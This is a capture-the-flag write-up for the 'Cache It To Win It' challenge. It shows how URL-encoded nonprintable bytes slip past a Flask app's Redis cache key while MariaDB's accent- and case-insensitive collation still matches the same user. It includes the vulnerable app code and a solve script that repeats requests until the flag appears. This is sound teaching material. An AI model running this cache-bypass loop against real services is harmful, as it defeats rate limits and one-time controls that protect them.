# Cache It To Win It
## Summary
This challenge uses URL byte encodings to avoid a simple REDIS cache, allowing the attacker to execute the python code related to a path more often than intended.

**Artifacts:**
* `app.py`: vulnerable Flask server defined in a python file
* `docker-compose.yaml`: Docker compose file to spin up the Redis cache, MariaDB SQL database, and Flask server, and set up environment variables such as the flag.
* `Dockerfile`: the Dockerfile defining the Flask server environment.
* `init.sql`: initial SQL to create the necessary tables in the database.
* `requirements.txt`: Python requirements file
* `solve.py`: Python script to solve the challenge
* `test.py`: Python scripts to test python utf-8 implementation.


## Context

The `Cache It To Win It` challenge authors provide a website that serves as the challenge. They also provide a copy of the server source code, in the form of a Python file (`app.py`).

The server is a simple Flask server, which contains backend logic and serves the user a barebones frontend.

The site has very little user input, just assigning the user a unique user ID, then allowing them to check if they "won."

![Challenge Image](images/landing_page.png)

When the user clicks the link to check if they are a winner, they are directed to this page:

![Challenge Image](images/you_won.png)

Returning via the link and and checking again if you won does not decrement the counter, instead you get a cache hit in the response headers. 

Looking at the flask server, we can see the snipit that is handeling all of this logic

```python
def normalize_uuid(uuid: str):
    uuid_l = list(uuid)
    i = 0
    for i in range(len(uuid)):
        uuid_l[i] = uuid_l[i].upper()
        if uuid_l[i] == "-":
            uuid_l.pop(i)
            uuid_l.append(" ")

    return "".join(uuid_l)


def make_cache_key():
    return f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]  # prevent spammers from filling redis cache


check_bp = Blueprint("check_bp", __name__)


@check_bp.route("/check")
@cache.cached(timeout=604800, make_cache_key=make_cache_key)
def check():
    user_uuid = request.args.get("uuid")
    if not user_uuid:
        return {"error": "UUID parameter is required"}, 400

    run_query("UPDATE users SET value = value + 1 WHERE id = %s;", (user_uuid,))
    res = run_query("SELECT * FROM users WHERE id = %s;", (user_uuid,))
    g.cache_hit = False
    if "affected_rows" not in res:
        print("ERRROR:", res)
        return "Error"
    if res["affected_rows"] == 0:
        return "Invalid account ID"
    num_wins = res["result"][0]["value"]
    if num_wins >= 100:
        return f"""CONGRATS! YOU HAVE WON.............. A FLAG! {os.getenv("FLAG")}"""
    return f"""<p>Congrats! You have won! Only {100 - res["result"][0]["value"]} more wins to go.</p>
    <p>Next attempt allowed at: {(datetime.datetime.now() + datetime.timedelta(days=7)).isoformat(sep=" ")} UTC</p><p><a href="/">Go back to the homepage</a></p>"""
```

Every time a request is sent to the /check path, the server will check for a cached response based on the return of the make_cache_key function. That function takes in your uuid supplied, and returns a normalized version.

If there is a cache hit, the check() function will not run. If there is a cache miss, the check function will run `run_query("UPDATE users SET value = value + 1 WHERE id = %s;", (user_uuid,))`. This increments the counter in the row of the database with a matching uuid.

A query is then run to get the value of that counter, and if that row exists, and the counter is greater than or equal to 100, it prints the flag.

So the goal of this exploit becomes clear, find a way to run the check() code 100 times where the sql database interprates the same uuid, while making the cache not see the same uuid and thus filter the requests.

## Vulnerability

When an SQL server interprates strings,  it will use a collation type, which essentially defines how it decides if two strings are equal, and how to sort them if not. There are normally rules related to how it handes capital letters, whitespace, both generally and trailing, and the full utf character set with accents and the like.

By default, this mariaDB database uses the utf8mb4_uca1400_ai_ci collation. This collation is case insensitive (ci) and accent insensitive (ai).

The normalize_uuid function does capitalize every letter before saving in the cache, so we will not be able to just capitalize a letter to solve this, but it has no way to deal with accents. By default, python will both deal with the full utf-8 characterset, and allow nonprintable ascii chars in strings (whose format looks like "\01"). When a string containing one of these is passed to normalize-uuid, we can observe what happens with the test.py script:

```
b'Caf\xc3\xa9' normalized is b'CAF\xc3\x89'
b'cafe\xcc\x81' normalized is b'CAFE\xcc\x81'
b'cafe\x01' normalized is b'CAFE\x01'
b'cafe\x00' normalized is b'CAFE\x00'
```

The non-printable characters are kept, and thus will be used as part of the cache by the flast application.

Dealing with which ascii chars make valid accents is a bit of a pain, and there is little in the way of technical specifications that I could find online about this collation, so before we launch into a full utf-8 adventure, lets just try to append some random url-encoded non-printable characters to the end of the query string to see what happens.

```
https://cache-it-to-win-it.chall.lac.tf/check?uuid=a23d3e4b-bde2-4211-bf53-df0ddc42d301%01

Congrats! You have won! Only 98 more wins to go.
```

This worked! we have avoided the cache, and the counter decremented by 1.

We can just append many different nonprintable chars, solo or in combination, so that we decrement this counter all the way down to 0, and recieve the flag!

To automate this exploit, we can create a little script which essentially pulls the users unique UUID from the first request, then repeatadly appends incrementing nonprintable ascii characters to the end, and sends it to the /check endpoint until it sends the flag back.

```python
import requests
from bs4 import BeautifulSoup
server = "https://cache-it-to-win-it.chall.lac.tf/"
response = requests.get(server)
soup = BeautifulSoup(response.text, 'html.parser')
# getting the uuid string
uuid_str = soup.title.string
response = requests.get(server + "check?uuid=" + uuid_str)
add = ""
counter = 0
print("uuid:", uuid_str)
#iterating through nonprintable chars. We have to use 2 so the total gets to 100.
while "FLAG" not in response.text:
    add = "%" + hex(counter % 31)[2:].zfill(2) + "%" + hex(counter // 31)[2:].zfill(2)
    response = requests.get(server + "check?uuid=" + uuid_str + add)
    counter += 1
print(response.text)
```

## Configuration Notes

Run docker-compose up in the directory with the docker compose file to run the challenge. It will spin up docker containers for the flask server, database, and redis cache.

Execute the target script against a local container by changing the server variable to point at localhost and the defined IP (by default 5000 in the docker compose.) So if you keep the defaults and that port is open, the server variable should be `http://localhost:5000/`

Then, just running the script should quickly solve the challenge. It will take a bit longer to solve it against a remote box as the connection latency of sending 100 requests is the biggest bottleneck with this exploit.